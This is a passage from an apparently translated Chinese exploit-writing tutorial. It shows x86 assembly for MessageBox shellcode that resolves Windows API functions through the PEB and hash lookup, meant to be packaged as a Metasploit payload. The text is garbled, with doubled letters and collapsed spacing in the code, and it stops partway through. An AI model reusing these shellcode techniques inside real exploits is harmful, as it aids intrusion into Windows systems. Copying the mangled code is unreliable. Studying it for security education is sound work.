赖）
将你的 sssshhhheeeellllllllccccooooddddeeee 作为 ppppaaaayyyyllllooooaaaadddd加入到 MMMMeeeettttaaaassssppppllllooooiiiitttt
将简单的payload不难。你唯一需要记住的是你的payload能够允许插入参数。因此如果你
想把MessageBoxshellcode加入到Metasploit，你将会不得不找到标题和文本字符串在
shellcode中的位置，并且允许用户插入他们自己的东西。
我已经将MessageBox代码稍微改了一下，字符串将会在代码的末尾。Asm代码是这样的：
;SampleshellcodethatwillpopaMessageBox
;withcustomtitleandtext
;WrittenbyPeterVanEeckhoutte
;http://www.corelan.be:8800
[Section.text]
[BITS32]
global_start
_start:
;===========FUNCTIONS=============
;=======Function:GetKernel32baseaddress============
;Technique:PEBInMemoryOrderModuleList
pushesi
xoreax,eax ;cleareax
xorebx,ebx
movbl,0x30
moveax,[fs:ebx] ;getapointertothePEB
moveax,[eax+0x0C] ;getPEB->Ldr
moveax,[eax+0x14] ;getPEB->Ldr.InMemoryOrderModuleList.Flink(1stentry)
pusheax
popesi
moveax,[esi] ;getthenextentry(2ndentry)
pusheax
popesi
moveax,[esi] ;getthenextentry(3rdentry)
moveax,[eax+0x10] ;getthe3rdentriesbaseaddress(kernel32.dll)
popesi
jmpstart_main
;=======Function:Findfunctionbaseaddress============
find_function:
pushad ;saveallregisters
movebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
moveax, [ebp + 0x3c] ;skipoverMSDOSheader
movedx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
addedx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
movecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
movebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
addebx, ebp ;addbaseaddresstoit.
;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dececx ;ecx=ecx-1
movesi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
addesi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xoredi, edi ;zerooutedi
xoreax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)
;intoal,+incrementesi
testal, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
roredi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
addedi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmpcompute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmp edi, [esp + 0x28] ;see if computed hash matches requested hash (at
esp+0x28)
;edi=currentcomputedhash
;esi=currentfunctionname(string)
jnzfind_function_loop ;nomatch,gotonextsymbol
movebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofordinalsaddresstable
movcx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
movebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
mov eax, [ebx + 4 * ecx] ;get relative function offset from its ordinal and put in
eax
addeax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov[esp + 0x1c], eax ;overwritestackcopyofeaxsopopad
;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
ret
;=======Function : loop to lookup functions for a given dll (process all
hashes)============
find_funcs_for_dll:
lodsd ;loadcurrenthashintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
mov[edi],eax ;writefunctionpointerintoaddressatedi
addesp,0x08
addedi,0x04 ;increaseeditostorenextpointer
cmpesi,ecx ;didweprocessallhashesyet?
jnefind_funcs_for_dll ;getnexthashandlookupfunctionpointer
find_funcs_for_dll_finished:
ret
;=======Function:Getpointertouser32.dlltext============
GetUser32: ;Definelabelforlocationofuser32.dllstring
callUser32Return ;callreturnlabelsothereturnaddress
;(locationofstring)ispushedontostack
db"user32.dll" ;Writetherawbytesintotheshellcode
db0x00 ;Terminateourstringwithanullcharacter.
;=======Function:Getpointerstofunctionhashes============
GetHashes:
callGetHashesReturn
;LoadLibraryA hash:0x8E4E0EEC
db0x8E
db0x4E
db0x0E
db0xEC
;ExitProcess hash=0x7ED8E273
db0x7E
db0xD8
db0xE2
db0x73
GetMsgBoxHash:
callGetMsgBoxHashReturn
;MessageBoxA hash=0xA8A24DBC
db0xA8
db0xA2
db0x4D
db0xBC
;==================================================================
;===================MAINAPPLICATION==============================
;==================================================================
start_main:
subesp,0x08 ;allocatespaceonstacktostore2things:
;inthisorder:ptrtoLoadLibraryA,ExitProc
movebp,esp ;setebpasframeptrforrelativeoffset
;sowewillbeabletodothis:
;callebp+4 =ExecuteLoadLibraryA
;callebp+8 =ExecuteExitProcess
movedx,eax ;savebaseaddressofkernel32inedx
;locate functionsinsidekernel32first
jmpGetHashes ;getaddressoffirsthash
GetHashesReturn:
popesi ;getpointertohashintoesi
leaedi,[ebp+0x4] ;wewillstorethefunctionaddressesatedi
;(ediwillbeincreasedwith0x04foreachhash)
;(seeresolve_symbols_for_dll)
movecx,esi
addecx,0x08 ;storeaddressoflasthashintoecx
callfind_funcs_for_dll ;getfunctionpointersforthe2
;kernel32functionhashes
;andputthematebp+4andebp+8
;locatefunctioninuser32.dll
;loadlibraryfirst-sofirstputpointertostringuser32.dlltostack
jmpGetUser32
User32Return:
;pointerto"user32.dll"isnowontopofstack,sojustcallLoadLibrary
call[ebp+0x4]
;thebaseaddressofuser32.dllisnowineax(ifloadedcorrectly)
;putitinedxsoitcanbeusedinfind_function
movedx,eax
;findtheMessageBoxAfunction
;firstgetpointertofunctionhash
jmpGetMsgBoxHash
GetMsgBoxHashReturn :
;putpointerinesiandpreparetolookupfunction
popesi
lodsd ;loadcurrenthashintoeax(pointedtobyesi)
pusheax ;pushhashtostack
pushedx ;pushbaseaddressofdlltostack
callfind_function
;functionaddressshouldbeineaxnow
;we'llkeepitthere
jmpGetTitle ;jumptothelocation
;oftheMsgBoxTitlestring
TitleReturn: ;Definealabeltocallsothat
;stringaddressispushedonstack
popebx ;ebxnowpointstoTitlestring
jmpGetText ;jumptothelocation
;oftheMsgBoxTextstring
TextReturn: ;Definealabeltocallsothat
;stringaddressispushedonstack
popecx ;ecxnowpointstoTextstring
;nowpushparameterstothestack
xoredx,edx ;zerooutedx